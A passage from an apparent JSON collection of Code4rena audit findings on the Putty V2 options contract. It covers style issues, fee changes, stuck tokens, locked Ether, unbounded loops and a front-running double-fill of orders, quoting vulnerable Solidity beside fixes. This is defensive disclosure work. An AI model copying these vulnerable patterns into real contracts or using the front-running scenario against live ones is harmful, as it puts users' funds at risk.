      "content": "\nThere is an inconsistent use of named return variables in the `PuttyV2` contract\n\nSome functions return named variables, others return explicit values.\n\nFollowing function return explicit value\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L669>\n\n```solidity\nfunction isWhitelisted(address[] memory whitelist, address target) public pure returns (bool) {\n    for (uint256 i = 0; i < whitelist.length; i++) {\n        if (target == whitelist[i]) return true;\n    }\n\n    return false;\n}\n```\n\nFollowing function return return a named variable\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L683>\n\n```solidity\nfunction hashOppositeOrder(Order memory order) public view returns (bytes32 orderHash) {\n    // use decode/encode to get a copy instead of reference\n    Order memory oppositeOrder = abi.decode(abi.encode(order), (Order));\n\n    // get the opposite side of the order (short/long)\n    oppositeOrder.isLong = !order.isLong;\n    orderHash = hashOrder(oppositeOrder);\n}\n```\n\n### Recommendation\n\nConsider adopting a consistent approach to return values throughout the codebase by removing all named return variables, explicitly declaring them as local variables, and adding the necessary return statements where appropriate. This would improve both the explicitness and readability of the code, and it may also help reduce regressions during future code refactors.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42740",
      "title": "[N-06] Code Can Be Refactored To Be More Readable",
      "impact": "LOW",
      "content": "\nIn many parts of the `PuttyV2` contract, it uses the following conditions to check the type of the order being passed into the function:\n\n*   order.isLong && order.isCall (equal to long call)\n*   order.isLong && !order.isCall (equal to long put)\n*   order.!isLong && order.isCall (equal to short call)\n*   order.!isLong && order.!isCall (equal to short put)\n\nThese affect the readability of the codes as the readers have to interpret the condition to determine if it is a \"long call\", \"long put\", \"short call\" or \"short put\". This might increase the risk of mistakes in the future if new developer works on the contracts.\n\n### Recommendation\n\nConsider implementing the following functions to improve readability:\n\n*   isLongCall(Order order) public view returns (bool)\n*   isLongPut(Order order) public view returns (bool)\n*   isShortCall(Order order) public view returns (bool)\n*   isShortPut(Order order) public view returns (bool)\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42739",
      "title": "[N-05] Consider two-phase ownership transfer",
      "impact": "LOW",
      "content": "\nAdmin calls `Ownable.transferOwnership` function to transfers the ownership to the new address directly. As such, there is a risk that the ownership is transferred to an invalid address, thus causing the contract to be without a owner.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L53>\n\n```solidity\ncontract PuttyV2 is PuttyV2Nft, EIP712(\"Putty\", \"2.0\"), ERC721TokenReceiver, Ownable {\n```\n\n### Recommendation\n\nConsider implementing a two step process where the admin nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of admin to fully succeed. This ensures the nominated EOA account is a valid and active account.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42738",
      "title": "[N-04] Owner Can Renounce Ownership",
      "impact": "LOW",
      "content": "\nTypically, the contract’s owner is the account that deploys the contract. As a result, the owner is able to perform certain privileged activities.\n\nThe Openzeppelin's `Ownable` used in `PuttyV2` contract implements `renounceOwnership`. This can represent a certain risk if the ownership is renounced for any other reason than by design. Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L53>\n\n```solidity\n/**\n    @title PuttyV2\n    @author out.eth\n    @notice An otc erc721 and erc20 option market.\n */\ncontract PuttyV2 is PuttyV2Nft, EIP712(\"Putty\", \"2.0\"), ERC721TokenReceiver, Ownable {\n```\n\n### Recommendation\n\nWe recommend to either reimplement the function to disable it or to clearly specify if it is part of the contract design\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42737",
      "title": "[N-03] Insufficient Tests",
      "impact": "LOW",
      "content": "\nIt is crucial to write tests with possibly 100% coverage for smart contract systems.\n\nThe following functions were found to be not included in the test cases:\n\n*   `PuttyV2.batchFillOrder` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L546>\n*   `PuttyV2.acceptCounterOffer` - <https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573>\n\n### Recommendation\n\nIt is recommended to write proper tests for all possible code flows and specially edge cases\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42736",
      "title": "[N-02] Draft OpenZeppelin Dependencies",
      "impact": "LOW",
      "content": "\nThe `PuttyV2` contract utilised `draft-EIP712` , an OpenZeppelin contract. This contract is still a draft and is not considered ready for mainnet use. OpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L40>\n\n```solidity\nimport \"openzeppelin/utils/cryptography/SignatureChecker.sol\";\nimport \"openzeppelin/utils/cryptography/draft-EIP712.sol\";\nimport \"openzeppelin/utils/Strings.sol\";\n```\n\n### Recommendation\n\nEnsure the development team is aware of the risks of using a draft contract or consider waiting until the contract is finalised.\n\nOtherwise, make sure that development team are aware of the risks of using a draft OpenZeppelin contract and accept the risk-benefit trade-off.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42735",
      "title": "[N-01] Omissions in events",
      "impact": "LOW",
      "content": "\nThroughout the codebase, events are generally emitted when sensitive changes are made to the contracts. However, some events are missing important parameters\n\n#### Instance #1 - Missing Old Value\n\nWhen setting a new `baseURI` and `fee`, only the new value is emitted within the event.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L228>\n\n```solidity\nfunction setBaseURI(string memory _baseURI) public payable onlyOwner {\n    baseURI = _baseURI;\n    emit NewBaseURI(_baseURI);\n}\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240>\n\n```solidity\nfunction setFee(uint256 _fee) public payable onlyOwner {\n    require(_fee < 30, \"fee must be less than 3%\");\n    fee = _fee;\n    emit NewFee(_fee);\n}\n```\n\nThe events should include the new value and old value where possible.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42734",
      "title": "[M-11] `fee` can change without the consent of users",
      "impact": "MEDIUM",
      "content": "_Submitted by Picodes, also found by 0xNineDec, 0xsanson, antonttc, berndartmueller, BowTiedWardens, catchup, dirk_y, Alex the Entreprenerd, horsefacts, Metatron, sseefried, and unforgiven_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L240>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L497>\n\n### Impact\n\nFees are applied during `withdraw`, but can change between the time the order is filled and its terms are agreed upon and the withdrawal time, leading to a loss of the expected funds for the concerned users.\n\n### Proof of Concept\n\nThe scenario would be:\n\n*   Alice and Bob agrees to fill an order at a time fees are 0.1%\n*   During the duration of the option, fees are increased to 3%\n*   At withdrawal they'll pay 3% of the strike, although they wouldn't have created the order in the first place with such fees\n\n### Recommended Mitigation Steps\n\nMitigation could be:\n\n*   Store the fees in `Order` and verify that they are correct when the order is filled, so they are hardcoded in the struct\n*   Add a timestamp: this wouldn't fully mitigate but would still be better than the current setup\n*   Keep past fees and fee change timestamps in memory (for example in an array) to be able to retrieve the creation time fees at withdrawal\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/422#issuecomment-1178988085):**\n > Report: Admin can change fee at any time for existing orders.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/422#issuecomment-1185414532):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/4.\n\n**hyh (warden) reviewed mitigation:**\n > The same fix as in [H-01](https://github.com/code-423n4/2022-06-putty-findings/issues/269).\n\n***\n\n",
      "summary": "\nThe bug report highlights an issue with the PuttyV2 smart contract, where fees can be changed after an order is filled and before it is withdrawn. This can result in a loss of expected funds for users. A proof of concept scenario is provided, along with recommended mitigation steps such as storing fees in the order and adding a timestamp. The issue has been confirmed and resolved by the Putty Finance team, with a fix implemented in a pull request. A warden has also reviewed and approved the proposed mitigation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/422",
      "tags": [],
      "finders": []
    },
    {
      "id": "42733",
      "title": "[M-08] Overlap Between `ERC721.transferFrom()` and `ERC20.transferFrom()` Allows `order.erc20Assets` or `order.baseAsset` To Be ERC721 Rather Than ERC20",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird, also found by reassor and sseefried_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L344>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L360>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L601>\n\n### Impact\n\nBoth `ERC20.transferFrom(address to, address  from, uint256 amount)` and `ERC721.transferFrom(address to, address from, uint256 id)` have the same function signature `0x23b872dd`. The impact of this is it's possible for `baseAsset` or `erc20Assets` to be ERC721 addresses rather than ERC20.\n\nThese functions will successfully transfer the NFT into the protocol however they will fail to transfer the NFT out of the contract. That is because the outgoing transfer is `ERC20.safeTransfer()` which calls `transfer(to, amount)` which does not match up with any valid function signatures on ERC721.\n\nTherefore any ERC721 tokens transferred into the contract in this manner via `fillOrder()` will be permanently stuck in the contract as neither `exercise()` nor `withdraw()` will successfully transfer the tokens out of the contract.\n\n### Proof of Concept\n\n[ERC721.transferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC721.sol#L82-L86)\n\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public virtual {\n```\n\n[ERC20.transferFrom()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/lib/solmate/src/tokens/ERC20.sol#L90-L94)\n\n```solidity\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n```\n\n### Recommended Mitigation Steps\n\nConsider whitelisting approved ERC721 and ERC20 token contracts. Furthermore, separate these two contracts into different whitelists for ERC20s and ERC721s then ensure each contract is in the right category.\n\n**[outdoteth (Putty Finance) acknowledged and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/52#issuecomment-1179004318):**\n > Report: If an ERC721 token is used in places where ERC20 assets are supposed to be used then ERC721 tokens can get stuck in withdraw() and exercise().\n\n**hyh (warden) reviewed mitigation:**\n > Requires asset whitelisting, now addressed on UI/DB level.\n\n***\n\n",
      "summary": "\nThe bug report highlights an issue with two functions in the PuttyV2.sol contract, which have the same function signature. This means that it is possible for ERC721 tokens to be used in places where ERC20 tokens are supposed to be used. As a result, these ERC721 tokens can get stuck in the contract and cannot be transferred out. The report recommends implementing a whitelist for approved ERC20 and ERC721 token contracts to prevent this issue. The team behind Putty Finance has acknowledged and addressed this issue on the user interface and database level. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/52",
      "tags": [],
      "finders": []
    },
    {
      "id": "42732",
      "title": "[M-05] `fillOrder()` and `exercise()` may lock Ether sent to the contract, forever",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by 0x29A, 0xc0ffEE, 0xDjango, AmitN, auditor0517, berndartmueller, BowTiedWardens, cccz, danb, dipp, dirk_y, hansfriese, horsefacts, hyh, joestakey, kirk-baird, oyc_109, peritoflores, rfa, sashik_eth, simon135, sseefried, StErMi, swit, xiaoming90, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L324>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L338>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L436>\n\n### Impact\n\n`fillOrder()` and `exercise()` have code paths that require Ether to be sent to them (e.g. using WETH as the base asset, or the provision of the exercise price), and therefore those two functions have the `payable` modifier. However, there are code paths within those functions that do not require Ether. Ether passed to the functions, when the non-Ether code paths are taken, is locked in the contract forever, and the sender gets nothing extra in return for it.\n\n### Proof of Concept\n\nEther can't be pulled from the `order.maker` during the filling of a long order, so `msg.value` shouldn't be provided here:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n323           if (order.isLong) {\n324               ERC20(order.baseAsset).safeTransferFrom(order.maker, msg.sender, order.premium);\n325           } else {\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L323-L325>\n\nIf the `baseAsset` isn't WETH during order fulfillment, `msg.value` is unused:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n337               } else {\n338                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, order.maker, order.premium);\n339               }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L337-L339>\n\nSame for the exercise of call options:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n435               } else {\n436                   ERC20(order.baseAsset).safeTransferFrom(msg.sender, address(this), order.strike);\n437               }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L435-L437>\n\n### Recommended Mitigation Steps\n\nAdd a `require(0 == msg.value)` for the above three conditions.\n\n**[Alex the Entreprenerd (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1174516212):**\n > Why would the caller send ETH when they don't have to?\n\n**[sseefried (warden) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1174603678):**\n > User error is one possibility. \n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1179001561):**\n > Report: Native ETH can be lost if it’s not utilised in exercise and fillOrder.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/226#issuecomment-1185413512):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/5.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed with native funds amount control added to strike transfer logic of `fillOrder`. Zero strike and zero premium corner cases are yet unhandled as described in [M.M-01](#mm-01-weth-zero-strike-call-fillorders-msgvalue-will-be-lost) and [M.M-02](#mm-02-zero-premium-short-fillorders-msgvalue-will-be-lost) in the Mitigation Review below.\n\n***\n\n",
      "summary": "\nThis bug report was submitted by multiple users and found in the PuttyV2.sol contract code. The issue is that the `fillOrder()` and `exercise()` functions can receive Ether even though there are code paths where it is not needed. This means that the Ether sent to these functions will be locked in the contract forever and the sender will not receive anything in return. A proof of concept was provided to show how this can happen. The recommended mitigation steps include adding a `require(0 == msg.value)` for certain conditions in the code. The developers of Putty Finance have confirmed and resolved the issue with a pull request. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/226",
      "tags": [],
      "finders": []
    },
    {
      "id": "42731",
      "title": "[M-02] Unbounded loops may cause `exercise()`s and `withdraw()`s to fail",
      "impact": "MEDIUM",
      "content": "_Submitted by IllIllI, also found by 0xNineDec, sashik_eth, shung, and xiaoming90_\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650>\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661>\n\n### Impact\n\nThere are no bounds on the number of tokens transferred in an order, and gas requirements can change (especially since orders can have a duration of [27 years](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L287)), so orders filled at time T1 may not be exercisable/withdrawable at time T2, or with the provided assets if the assets use a lot of gas during their transfers (e.g. aTokens and cTokens). The buyer of the option will have paid the premium, and will be unable to get the assets they are owed.\n\n### Proof of Concept\n\nThere are no upper bounds on the number of assets being transferred in these loops:\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #1\n\n636       function _transferERC20sOut(ERC20Asset[] memory assets) internal {\n637           for (uint256 i = 0; i < assets.length; i++) {\n638               ERC20(assets[i].token).safeTransfer(msg.sender, assets[i].tokenAmount);\n639           }\n640       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L636-L640>\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #2\n\n646       function _transferERC721sOut(ERC721Asset[] memory assets) internal {\n647           for (uint256 i = 0; i < assets.length; i++) {\n648               ERC721(assets[i].token).safeTransferFrom(address(this), msg.sender, assets[i].tokenId);\n649           }\n650       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L646-L650>\n\n```solidity\nFile: contracts/src/PuttyV2.sol   #3\n\n657       function _transferFloorsOut(address[] memory floorTokens, uint256[] memory floorTokenIds) internal {\n658           for (uint256 i = 0; i < floorTokens.length; i++) {\n659               ERC721(floorTokens[i]).safeTransferFrom(address(this), msg.sender, floorTokenIds[i]);\n660           }\n661       }\n```\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L657-L661>\n\n### Recommended Mitigation Steps\n\nHave an upper bound on the number of assets, or allow them to be transferred out one at a time, if necessary\n\n**[outdoteth (Putty Finance) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/227#issuecomment-1177670801):**\n > Adding a hardcoded check at the contract level is not a viable fix given that gas costs and limits are subject change over time.\n> Instead, there already exists a limit of 30 assets on the frontend/db level.\n\n**[outdoteth (Putty Finance) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/227#issuecomment-1179001005):**\n > Report: Unbounded loop can prevent put option from being exercised.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-06-putty-findings/issues/227#issuecomment-1179845396):**\n > Medium severity is justified because, while very unlikely to happen, there could be a loss of assets.\n\n**hyh (warden) reviewed mitigation:**\n > Now addressed on UI/DB level.\n\n***\n\n",
      "summary": "\nThis bug report was submitted by several people and found in the PuttyV2.sol contract. The bug allows for an unlimited number of tokens to be transferred in an order, which can cause issues with gas requirements and potentially make orders unexercisable or unwithdrawable. The proof of concept shows that there are no upper limits on the number of assets that can be transferred in certain loops in the code. The recommended mitigation steps include implementing an upper bound on the number of assets or allowing them to be transferred out one at a time. The team behind Putty Finance has acknowledged the issue but disagrees with the severity and has implemented a limit of 30 assets on the frontend and database level. The judge has deemed the bug to have a medium severity as there is a potential for loss of assets, although it is unlikely to occur. The warden has reviewed the mitigation steps and believes it has been addressed on the UI and database level. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/227",
      "tags": [],
      "finders": []
    },
    {
      "id": "42730",
      "title": "[H-02] `acceptCounterOffer()` May Result In Both Orders Being Filled",
      "impact": "HIGH",
      "content": "_Submitted by kirk-baird, also found by csanuragjain, hansfriese, Lambda, and minhquanym_\n\nWhen a user is attempting to accept a counter offer they call the function [acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) with both the `originalOrder` to be cancelled and the new `order` to fill. It is possible for an attacker (or any other user who happens to call `fillOrder()` at the same time) to fill the `originalOrder` before `acceptCounterOffer()` cancels it.\n\nThe impact is that both `originalOrder` and `order` are filled. The `msg.sender` of `acceptCounterOffer()` is twice as leveraged as they intended to be if the required token transfers succeed.\n\n### Proof of Concept\n\n[acceptCounterOffer()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L573-L584) calls `cancel()` on the original order, however it will not revert if the order has already been filled.\n\n```solidity\n    function acceptCounterOffer(\n        Order memory order,\n        bytes calldata signature,\n        Order memory originalOrder\n    ) public payable returns (uint256 positionId) {\n        // cancel the original order\n        cancel(originalOrder);\n\n\n        // accept the counter offer\n        uint256[] memory floorAssetTokenIds = new uint256[](0);\n        positionId = fillOrder(order, signature, floorAssetTokenIds);\n    }\n```\n\n[cancel()](https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526-L535) does not revert if an order has already been filled it only prevents future `fillOrder()` transactions from succeeding.\n\n```solidity\n    function cancel(Order memory order) public {\n        require(msg.sender == order.maker, \"Not your order\");\n\n\n        bytes32 orderHash = hashOrder(order);\n\n\n        // mark the order as cancelled\n        cancelledOrders[orderHash] = true;\n\n\n        emit CancelledOrder(orderHash, order);\n    }\n```\n\nTherefore any user may front-run the `acceptCounterOffer()` transaction with a `fillOrder()` transaction that fills the original order. As a result the user ends up filling both `order` and `originalOrder`. Then `acceptCounterOffer()` cancels the `originalOrder` which is essentially a no-op since it's been filled and continues to fill the new `order` resulting in both orders being filled.\n\n### Recommended Mitigation Steps\n\nConsider having `cancel()` revert if an order has already been filled. This can be done by adding the following line `require(_ownerOf[uint256(orderHash)] == 0)`.\n\n**[outdoteth (Putty Finance) confirmed and commented](https://github.com/code-423n4/2022-06-putty-findings/issues/44#issuecomment-1179004913):**\n > Report: It’s possible to fill an order twice by accepting a counter offer for an already filled order.\n\n**[outdoteth (Putty Finance) resolved](https://github.com/code-423n4/2022-06-putty-findings/issues/44#issuecomment-1185411950):**\n > PR with fix: https://github.com/outdoteth/putty-v2/pull/2.\n\n**hyh (warden) reviewed mitigation:**\n > Fixed by requiring that order can't be in the filled state on cancel. This fully adheres to the original logic, but wasn't controlled for before.\n\n\n***\n\n",
      "summary": "\nThe bug report is about a vulnerability in the code for Putty Finance, a platform for trading digital assets. The bug allows an attacker to fill an order twice by accepting a counter offer for an already filled order. This results in both orders being filled and the person making the transaction being twice as leveraged as intended. The impact of this bug is that it can cause financial loss for users. The report suggests a mitigation step to fix the bug, which involves adding a line of code to prevent the order from being filled if it has already been filled. The bug has been confirmed and resolved by the team at Putty Finance. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "https://github.com/code-423n4/2022-06-putty-findings/issues/44",
      "tags": [],
      "finders": []
    },
    {
      "id": "5015",
      "title": "[L-07] No Check if onERC721Received Is Implemented",
      "impact": "LOW",
      "content": "\nThe `PuttyV2.fillOrder` will mint a long position NFT and short position NFT to the order maker and taker. When minting a NFT, the function does not check if a receiving contract implements onERC721Received().\n\nThe intention behind this function is to check if the address receiving the NFT, if it is a contract, implements onERC721Received(). Thus, there is no check whether the receiving address supports ERC-721 tokens and position could be not transferrable in some cases.\n\nFollowing shows that `_mint` is used instead of `_safeMint`.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L303>\n\n```solidity\nfunction fillOrder(\n\tOrder memory order,\n\tbytes calldata signature,\n\tuint256[] memory floorAssetTokenIds\n) public payable returns (uint256 positionId) {\n\t..SNIP..\n\t// create long/short position for maker\n\t_mint(order.maker, uint256(orderHash));\n\n\t// create opposite long/short position for taker\n\tbytes32 oppositeOrderHash = hashOppositeOrder(order);\n\tpositionId = uint256(oppositeOrderHash);\n\t_mint(msg.sender, positionId);\n\t..SNIP..\n```\n\n### Recommendation\n\nConsider using [`_safeMint`](https://github.com/Rari-Capital/solmate/blob/3c738133a0c1697096d63d28ef7a8ef298f9af6b/src/tokens/ERC721.sol#L193) instead of [`_mint`](https://github.com/Rari-Capital/solmate/blob/3c738133a0c1697096d63d28ef7a8ef298f9af6b/src/tokens/ERC721.sol#L157).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-07-no-check-if-onerc721received-is-implemented",
      "tags": [],
      "finders": []
    },
    {
      "id": "5014",
      "title": "[L-06] Order Can Be Cancelled Even After Being Filled",
      "impact": "LOW",
      "content": "\nOnce an order has been filled, no one should be able to cancel the order or mark the order as `Cancelled`.\n\nThe following code shows that the order maker can change the status of the order to `Cancelled` at any point of time.\n\n<https://github.com/code-423n4/2022-06-putty/blob/3b6b844bc39e897bd0bbb69897f2deff12dc3893/contracts/src/PuttyV2.sol#L526>\n\n```solidity\n/**\n    @notice Cancels an order which prevents it from being filled in the future.\n    @param order The order to cancel.\n */\nfunction cancel(Order memory order) public {\n    require(msg.sender == order.maker, \"Not your order\");\n\n    bytes32 orderHash = hashOrder(order);\n\n    // mark the order as cancelled\n    cancelledOrders[orderHash] = true;\n\n    emit CancelledOrder(orderHash, order);\n}\n```\n\nAlthough changing the status of an order to `Cancelled` after it has been filled does not cause any lost of funds at the later stages (e.g. when exercising or withdrawing), it might cause unnecessary confusion to the users as it does not accurately reflect the status of an order on-chain.\n\nUsers might fetch the status of an order directly from the `cancelledOrders` mapping or poll the on-chain for emitted event, and come to a wrong conclusion that since the order has been cancelled, it has not been filled.\n\n### Recommendation\n\nIt is recommended to update the `cancel` function to only allow order maker to call this function only if an order has not been filled.\n\n```solidity\nfunction cancel(Order memory order) public {\n    require(msg.sender == order.maker, \"Not your order\");\n\n    bytes32 orderHash = hashOrder(order);\n    \n    // If an order has been filled, the positionExpirations[orderHash] will be populated.\n    require(positionExpirations[orderHash] == 0, \"Order has already been filled. Cannot cancel.\")\n\n    // mark the order as cancelled\n    cancelledOrders[orderHash] = true;\n\n    emit CancelledOrder(orderHash, order);\n}\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Putty",
      "source_link": "https://code4rena.com/reports/2022-06-putty",
      "github_link": "#l-06-order-can-be-cancelled-even-after-being-filled",
      "tags": [],
      "finders": []
    },
    {
      "id": "5013",
